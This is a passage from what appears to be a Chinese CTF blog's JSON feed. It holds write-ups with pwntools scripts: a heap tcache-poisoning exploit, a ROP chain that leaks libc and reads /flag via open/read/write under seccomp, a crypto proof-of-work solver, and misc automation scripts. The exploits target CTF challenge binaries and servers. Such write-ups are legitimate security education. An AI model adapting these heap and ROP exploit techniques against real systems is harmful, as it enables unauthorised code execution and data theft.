class=\"keyword\">return</span> u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">cho</span>(<span class=\"params\">num</span>):</span><br><span class=\"line\">    sla(<span class=\"string\">&quot;0.exit\\n&quot;</span>,<span class=\"built_in\">str</span>(num))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">size,idx</span>):</span><br><span class=\"line\">    cho(<span class=\"number\">1</span>)</span><br><span class=\"line\">    sla(<span class=\"string\">&quot;Size:&quot;</span>,<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    sla(<span class=\"string\">&quot;Index:&quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    cho(<span class=\"number\">3</span>)</span><br><span class=\"line\">    sla(<span class=\"string\">&quot;Index:&quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    cho(<span class=\"number\">4</span>)</span><br><span class=\"line\">    sla(<span class=\"string\">&quot;Index:&quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">idx,size,data</span>):</span><br><span class=\"line\">    cho(<span class=\"number\">2</span>)</span><br><span class=\"line\">    sla(<span class=\"string\">&quot;Index:&quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    sla(<span class=\"string\">&quot;Size&quot;</span>,<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    sa(<span class=\"string\">&quot;Content&quot;</span>,data)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">backdoor</span>():</span><br><span class=\"line\">    cho(<span class=\"number\">5</span>)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">decrypt</span>(<span class=\"params\">x</span>):</span><br><span class=\"line\">    io = process(<span class=\"string\">&#x27;./spn_dec.py&#x27;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(x&amp;<span class=\"number\">0xffff</span>))</span><br><span class=\"line\">    a = <span class=\"built_in\">int</span>(io.recv()[:-<span class=\"number\">1</span>])</span><br><span class=\"line\">    io.close()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> a</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">spn_dec</span>(<span class=\"params\">x</span>):</span><br><span class=\"line\">    a1 = decrypt(x)</span><br><span class=\"line\">    a2 = decrypt(x&gt;&gt;<span class=\"number\">16</span>)</span><br><span class=\"line\">    a3 = decrypt(x&gt;&gt;<span class=\"number\">32</span>)</span><br><span class=\"line\">    aa = a1+a2*<span class=\"number\">0x10000</span>+a3*<span class=\"number\">0x100000000</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(a3),<span class=\"built_in\">hex</span>(a2),<span class=\"built_in\">hex</span>(a1))</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(aa)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> aa</span><br><span class=\"line\"></span><br><span class=\"line\">ru(<span class=\"string\">&quot;gift:&quot;</span>)</span><br><span class=\"line\">shell_addr=<span class=\"built_in\">int</span>(ru(<span class=\"string\">&#x27;\\n&#x27;</span>),<span class=\"number\">16</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(shell_addr))</span><br><span class=\"line\">aa = spn_dec(shell_addr)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(aa))</span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,<span class=\"number\">1</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,<span class=\"number\">2</span>)</span><br><span class=\"line\">delete(<span class=\"number\">2</span>)</span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>,<span class=\"number\">0x26</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x20</span>+p64(aa)[:-<span class=\"number\">2</span>])</span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,<span class=\"number\">3</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,<span class=\"number\">4</span>)</span><br><span class=\"line\">edit(<span class=\"number\">4</span>,<span class=\"number\">2</span>,<span class=\"string\">b&#x27;aa&#x27;</span>)</span><br><span class=\"line\">backdoor()</span><br><span class=\"line\">ia()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 害，身为菜鸡，我连脚本都没大佬写得好看</span></span><br></pre></td></tr></table></figure><br />\n 然后，我找到了另一种解法，输入 0x1000，数组越界写了 shell，可以直接 backdoor</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682436358/Typera/2023/04/0a873d7de40231b015e0a70c0c4466c6.png\" alt=\"image-20230425232554399\" /></p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"number\">0x1000</span>)</span><br><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"number\">0x20</span>)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>,<span class=\"number\">0x1000</span>+<span class=\"number\">2</span>,<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">backdoor()</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"checkin1127\"><a class=\"anchor\" href=\"#checkin1127\">#</a> checkin(11.27)</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL25vbmVTeWNhbW9yZS9hbm5leC9wd25fY2hlY2tpbi56aXA=\">附件下载</span></p>\n<h3 id=\"关于asan\"><a class=\"anchor\" href=\"#关于asan\">#</a> 关于 ASan</h3>\n<p>这道题使用了 ASan，是一种影子内存的技术。关于它的具体内容可以参考<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iZXN0d2luZy5tZS9BU2FuLWFuZC1BU2FuLWluLUNURiUyODBjdGYtYmFieWFlZ2lzJTI5Lmh0bWw=\">这篇文章</span><br />\n这里记录一点大致的内容<br />\n ASan 是 Google 开源的一个用于进行内存检测的工具，它由两个主要部分构成，插桩和动态运行库 (Run-time library)。<br />\n插桩主要是针对在 llvm 编译器级别对访问内存的操作 (store，load，alloca 等)，将它们进行处理。<br />\n动态运行库主要提供一些运行时的复杂的功能 (比如 poison/unpoison shadow memory) 以及将 malloc,free 等系统调用函数 hook 住<br />\n ASan 采用了直接内存映射策略，具体的映射策略如下所示<br />\n<strong> 64 位</strong></p>\n<blockquote>\n<p>Shadow = (Mem &gt;&gt; 3) + 0x7fff8000;</p>\n</blockquote>\n<p><strong>32 位</strong></p>\n<blockquote>\n<p>Shadow = (Mem &gt;&gt; 3) + 0x20000000;</p>\n</blockquote>\n<h3 id=\"关于orw\"><a class=\"anchor\" href=\"#关于orw\">#</a> 关于 orw</h3>\n<p><strong>由来：</strong><br />\n有些 pwn 题为了增加难度，会在程序初始化的时候增加 seccomp 函数，禁用掉除了 sys_open,sys_write,sys_read 以外的所有系统调用。也就是说我们无法通过 system（‘/bin/sh’）来 getshell，只能通过 o，r，w 这三个系统调用获取 flag。<br />\n<strong>漏洞利用：</strong><br />\n首先调用 open 函数打开 flag 文件。<br />\n然后读取 flag 文件。<br />\n最后通过 wirte 将 flag 打印出来。<br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sys_open(<span class=\"string\">&quot;flag&quot;</span>)//读取flag</span><br><span class=\"line\">sys_read(<span class=\"string\">&quot;rax&quot;</span>,<span class=\"string\">&quot;rsp&quot;</span>,<span class=\"number\">0x40</span>)//rax为sysoopen的返回值，也就是flag，然后将flag写到esp下</span><br><span class=\"line\">sys_write(<span class=\"number\">1</span>,<span class=\"string\">&quot;rsp&quot;</span>,<span class=\"number\">0x40</span>)//打印flag的值到屏幕输出</span><br></pre></td></tr></table></figure><br />\n 害，还是知识不到位，这里再放一篇挺详细的<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY29kZWxlYWRpbmcuY29tL2FydGljbGUvNzIzMTU3MzU1MTgv\"> orw 介绍</span></p>\n<h3 id=\"分析\"><a class=\"anchor\" href=\"#分析\">#</a> 分析</h3>\n<p>pwn 内可以任意地址写一个字节，故修改 _ZN14__interception21real___isoc99_vfscanfE 的第二个字节，使其指向 gets 函数 (0x73ED28)<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682436366/Typera/2023/04/38fe2a7349d7b29477d22b0f72026408.png\" alt=\"image-20230425232602805\" /></p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sla(<span class=\"string\">b&#x27;Welcome! A gift for you:&#x27;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">0x73edb8</span>+<span class=\"number\">1</span>))</span><br><span class=\"line\">sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\">sd(<span class=\"string\">b&#x27;\\x91&#x27;</span>)</span><br><span class=\"line\">sa(<span class=\"string\">b&#x27;Leave a note.&#x27;</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x1f</span>)</span><br><span class=\"line\">sa(<span class=\"string\">b&quot;That&#x27;s all. Have fun!&quot;</span>,p64(<span class=\"number\">0x43FBB3</span>))</span><br></pre></td></tr></table></figure><br />\n 构造 rop，调用 gets 函数，泄露 libc_addr 地址<br />\n <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pop_rdi = <span class=\"number\">0x41af0b</span></span><br><span class=\"line\">pop_rsp = <span class=\"number\">0x484d50</span></span><br><span class=\"line\">call_puts = <span class=\"number\">0x43A286</span></span><br><span class=\"line\">rop = p64(pop_rdi)+p64(<span class=\"number\">0x72DE30</span>)+p64(call_puts)+<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x838</span>+p64(<span class=\"number\">0</span>)*<span class=\"number\">6</span>+p64(pop_rdi)+p64(<span class=\"number\">0xA00000</span>)+p64(<span class=\"number\">0x43FBB3</span>)+<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x30</span>+p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span>+p64(pop_rsp)+p64(<span class=\"number\">0xA00000</span>)</span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    p.recv()</span><br><span class=\"line\">    sl(rop)</span><br><span class=\"line\">    libc_addr = leak_address()-<span class=\"number\">0x407e0</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(libc_addr))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> libc_addr == <span class=\"number\">0x736572605c61</span>:</span><br><span class=\"line\">        p.close()</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">except</span> Exception:</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(libc_addr))</span><br></pre></td></tr></table></figure><br />\n 最后栈迁移 + orw 调用获取 flag 文件<br />\n <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">binsh=libc_addr+<span class=\"number\">0x1B3E1A</span></span><br><span class=\"line\">system=libc_addr+<span class=\"number\">0x4f550</span></span><br><span class=\"line\">pop_rsi=<span class=\"number\">0x000000000041ab7c</span></span><br><span class=\"line\">pop_rdx=<span class=\"number\">0x000000000043ced2</span></span><br><span class=\"line\">open_addr=libc_addr+libc.sym[<span class=\"string\">&#x27;open&#x27;</span>]</span><br><span class=\"line\">read_addr=libc_addr+libc.sym[<span class=\"string\">&#x27;read&#x27;</span>]</span><br><span class=\"line\">write_addr=libc_addr+libc.sym[<span class=\"string\">&#x27;write&#x27;</span>]</span><br><span class=\"line\">rop2 = p64(pop_rdi)+p64(<span class=\"number\">0xA00100</span>)+p64(pop_rsi)+p64(<span class=\"number\">0</span>)+p64(open_addr)</span><br><span class=\"line\">rop2 += p64(pop_rdi)+p64(<span class=\"number\">3</span>)+p64(pop_rsi)+p64(<span class=\"number\">0xA00200</span>)+p64(pop_rdx)+p64(<span class=\"number\">0x100</span>)+p64(read_addr)</span><br><span class=\"line\">rop2 += p64(pop_rdi)+p64(<span class=\"number\">1</span>)+p64(pop_rsi)+p64(<span class=\"number\">0xA00200</span>)+p64(pop_rdx)+p64(<span class=\"number\">0x100</span>)+p64(write_addr)</span><br><span class=\"line\">rop2 = rop2.ljust(<span class=\"number\">0x100</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)+<span class=\"string\">b&#x27;/flag\\x00&#x27;</span></span><br><span class=\"line\">sl(rop2)</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"slow_spn1129\"><a class=\"anchor\" href=\"#slow_spn1129\">#</a> slow_spn(11.29)</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL25vbmVTeWNhbW9yZS9hbm5leC9wd25fc2xvdy1zcG4uemlw\">附件下载</span><br />\n这题感觉挺奇怪的。。。<br />\n貌似除了 pwntools 工具，就没有用到啥和 pwn 相关的东西，主要的解题思路也没啥漏洞利用的感觉，大概属于密码。<br />\n程序的大概流程就是：从 flag 文件里面导出 key 和 plaintext，然后通过 s 盒和 p 盒放入 cache 里面.<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682436377/Typera/2023/04/d98248de6bbcdd6c0a8ae6fa6d3523de.png\" alt=\"image-20230425232612526\" /><br />\ncache 是题目实现的，最多可以往里添加 0x20 个数（模拟访问 s 盒中的地址），超过了会剔除最小的一个，若是 cache 命中了则使用算法计数，未命中则 sleep (1)，<br />\n由于题目给了一次访问 plaintext 在 s 盒中的地址的机会，所以可以通过遍历来爆破，通过 sleep (1) 判断 cache 是否命中，然后推出上图中 p，v9，v7，v5 以及 k&gt;&gt;8，k&gt;&gt;4，k 的值，然后拼接得到 key.<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682436385/Typera/2023/04/f5836a7db5ff249e037d1a839c975876.png\" alt=\"image-20230425232621850\" /></p>\n",
            "tags": [
                "Python",
                "CTF",
                "Pwn"
            ]
        },
        {
            "id": "https://www.sycamore.top/CyberSecurity/CTF/2021-%E7%BE%8A%E5%9F%8E%E6%9D%AF-wp/",
            "url": "https://www.sycamore.top/CyberSecurity/CTF/2021-%E7%BE%8A%E5%9F%8E%E6%9D%AF-wp/",
            "title": "2021-羊城杯_wp",
            "date_published": "2021-11-26T10:21:00.000Z",
            "content_html": "<div class=\"note warning\">\n<p>文章时间太早，图片丢失</p>\n</div>\n<h2 id=\"crypto-ringringring\"><a class=\"anchor\" href=\"#crypto-ringringring\">#</a> Crypto-RingRingRing</h2>\n<p>连上后先是让我们输验证码，MD5，这个没什么好说的，爆破一下就出了。<br />\n<img data-src=\"https://cdn.jsdelivr.net/gh/nonesycamore/whitzard_cdn/wp-content/uploads/2021/09/RRR1.png\" alt=\"\" /><br />\n然后让我们给出满足条件<br />\n <code>a**4 + b**4 + c**4 + d**4 = e**2</code> <br />\n 的 100 个 a,b,c,d,e<br />\n<img data-src=\"https://cdn.jsdelivr.net/gh/nonesycamore/whitzard_cdn/wp-content/uploads/2021/09/RRR2.png\" alt=\"\" /><br />\n 依旧是爆破，判断 <code>sqrt(a**4 + b**4 + c**4 + d**4)</code>  的值为整数时，依次输出 a,b,c,d,e 就可以了，输出 100 个之后返回就可以得到 flag<br />\n<img data-src=\"https://cdn.jsdelivr.net/gh/nonesycamore/whitzard_cdn/wp-content/uploads/2021/09/RRR3.png\" alt=\"\" /></p>\n<pre><code>from pwn import*\nfrom math import sqrt\nr=remote('192.168.39.25',2378)\ndef myhash(text):\n\tmysha = hashlib.md5()\n\tmysha.update(text)\n\treturn mysha.hexdigest()\n\ndef passPoW(plain, cipher):\n\tdic = string.digits+string.ascii_letters\n\tfor a0 in dic:\n\t\tfor a1 in dic:\n\t\t\tfor a2 in dic:\n\t\t\t\tfor a3 in dic:\n\t\t\t\t\tfor a4 in dic:\n\t\t\t\t\t\ttmp = bytes((str(a0)+str(a1)+str(a2)+str(a3)+str(a4)+str(plain)).encode())\n\t\t\t\t\t\tif(myhash(tmp)[0:5]==cipher):\n\t\t\t\t\t\t\treturn str(a0)+str(a1)+str(a2)+str(a3)+str(a4)\n\ndef q1():\n\tnum=0\n\tfor a in range(1,100):\n\t\tfor b in range(1,100):\n\t\t\tfor c in range(1,100):\n\t\t\t\tfor d in range(1,100):\n\t\t\t\t\tif(sqrt(a**4 + b**4 + c**4 + d**4)%1==0):\n\t\t\t\t\t\tprint(r.recvuntil('a:').decode())\n\t\t\t\t\t\tr.send(bytes(str(a).encode()))\n\t\t\t\t\t\t#print(bytes(str(a).encode()))\n\t\t\t\t\t\tprint(r.recvuntil('b:').decode())\n\t\t\t\t\t\tr.send(bytes(str(b).encode()))\n\t\t\t\t\t\t#print(bytes(str(b).encode()))\n\t\t\t\t\t\tprint(r.recvuntil('c:').decode())\n\t\t\t\t\t\tr.send(bytes(str(c).encode()))\n\t\t\t\t\t\t#print(bytes(str(c).encode()))\n\t\t\t\t\t\tprint(r.recvuntil('d:').decode())\n\t\t\t\t\t\tr.send(bytes(str(d).encode()))\n\t\t\t\t\t\t#print(bytes(str(d).encode()))\n\t\t\t\t\t\tprint(r.recvuntil('e:').decode())\n\t\t\t\t\t\tr.send(bytes(str(int(sqrt(a**4 + b**4 + c**4 + d**4))).encode()))\n\t\t\t\t\t\t#print(bytes(str(int(sqrt(a**4 + b**4 + c**4 + d**4))).encode()))\n\t\t\t\t\t\tprint(r.recvline())\n\t\t\t\t\t\tnum+=1\n\t\t\t\t\t\tprint(num)\n\t\t\t\t\t\tif(num == 100):\n\t\t\t\t\t\t\treturn\n\nst = r.recvuntil(b'\\n')\nprint(st.decode())\nplain = st[36:40].decode()\nprint(plain)\ncipher = st[50:-1].decode()\nprint(cipher)\nres = passPoW(plain, cipher)\nprint(res)\nprint(r.recv().decode())\nr.sendline(res.encode())\nq1()\nr.interactive()\n</code></pre>\n",
            "tags": [
                "Python",
                "Crypto",
                "CTF"
            ]
        },
        {
            "id": "https://www.sycamore.top/CyberSecurity/CTF/2021DASCTF%E5%AE%9E%E6%88%98%E7%B2%BE%E8%8B%B1%E5%A4%8F%E4%BB%A4%E8%90%A5%E6%9A%A8DASCTF-July-X-CBCTF-4th-misc%E9%83%A8%E5%88%86wp/",
            "url": "https://www.sycamore.top/CyberSecurity/CTF/2021DASCTF%E5%AE%9E%E6%88%98%E7%B2%BE%E8%8B%B1%E5%A4%8F%E4%BB%A4%E8%90%A5%E6%9A%A8DASCTF-July-X-CBCTF-4th-misc%E9%83%A8%E5%88%86wp/",
            "title": "2021DASCTF实战精英夏令营暨DASCTF July X CBCTF 4th misc部分wp",
            "date_published": "2021-11-26T10:20:21.000Z",
            "content_html": "<div class=\"note warning\">\n<p>文章时间太早，图片丢失</p>\n</div>\n<h2 id=\"misc-red_vs_blue\"><a class=\"anchor\" href=\"#misc-red_vs_blue\">#</a> Misc-red_vs_blue</h2>\n<p>简单来说就是 66 轮试错，同一次 nc 里面的答案是一样的，要么输入 r, 要么输入 b，错了就输入 y 重来，因为有时间限制，只能上脚本（本来还想手搓）<br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># sh=process(&quot;./buu--rip&quot;)  local端</span></span><br><span class=\"line\">sh = remote(<span class=\"string\">&#x27;node4.buuoj.cn&#x27;</span>, <span class=\"number\">28699</span>)</span><br><span class=\"line\">s = []</span><br><span class=\"line\">i=<span class=\"number\">1</span></span><br><span class=\"line\">tag=<span class=\"number\">0</span></span><br><span class=\"line\">q = sh.recvuntil(<span class=\"string\">&#x27;:&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    <span class=\"keyword\">if</span> i==<span class=\"number\">66</span>:</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> tag==<span class=\"number\">0</span>:</span><br><span class=\"line\">        sh.send(<span class=\"string\">&#x27;r&#x27;</span>)</span><br><span class=\"line\">        q=sh.recvuntil(<span class=\"string\">&#x27;:&#x27;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(q)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">b&#x27;again&#x27;</span>  <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> q:</span><br><span class=\"line\">            i+=<span class=\"number\">1</span>;s.append(<span class=\"string\">&#x27;r&#x27;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">continue</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span> :</span><br><span class=\"line\">             sh.send(<span class=\"string\">&#x27;y&#x27;</span>)</span><br><span class=\"line\">             <span class=\"keyword\">for</span> m <span class=\"keyword\">in</span> s:</span><br><span class=\"line\">                 sh.recvuntil(<span class=\"string\">&#x27;:&#x27;</span>)</span><br><span class=\"line\">                 sh.send(m)</span><br><span class=\"line\">             sh.recvuntil(<span class=\"string\">&#x27;:&#x27;</span>)  <span class=\"comment\">#</span></span><br><span class=\"line\">             tag = <span class=\"number\">1</span></span><br><span class=\"line\">             <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">elif</span> tag==<span class=\"number\">1</span>:</span><br><span class=\"line\">        sh.send(<span class=\"string\">&#x27;b&#x27;</span>)</span><br><span class=\"line\">        q=sh.recvuntil(<span class=\"string\">&#x27;:&#x27;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(q)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">b&#x27;again&#x27;</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> q:</span><br><span class=\"line\">            i += <span class=\"number\">1</span>;s.append(<span class=\"string\">&#x27;b&#x27;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">continue</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">              sh.send(<span class=\"string\">&#x27;y&#x27;</span>)</span><br><span class=\"line\">              <span class=\"keyword\">for</span> m <span class=\"keyword\">in</span> s:</span><br><span class=\"line\">                  sh.recvuntil(<span class=\"string\">&#x27;:&#x27;</span>)</span><br><span class=\"line\">                  sh.send(m)</span><br><span class=\"line\">              sh.recvuntil(<span class=\"string\">&#x27;:&#x27;</span>)<span class=\"comment\">#</span></span><br><span class=\"line\">              tag = <span class=\"number\">0</span></span><br><span class=\"line\">              <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(i)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure><br />\n 代码稍微有点小问题，第 66 轮直接跳出来了，懒得改了。。。<br />\n就随便猜一下然后就可以拿到 flag。</p>\n<hr />\n<h2 id=\"misc-funny_maze\"><a class=\"anchor\" href=\"#misc-funny_maze\">#</a> Misc-funny_maze</h2>\n<p>跟前面那题<br />\n差不多的思路，就是典型的迷宫问题多搞几次就能出来 flag.</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span 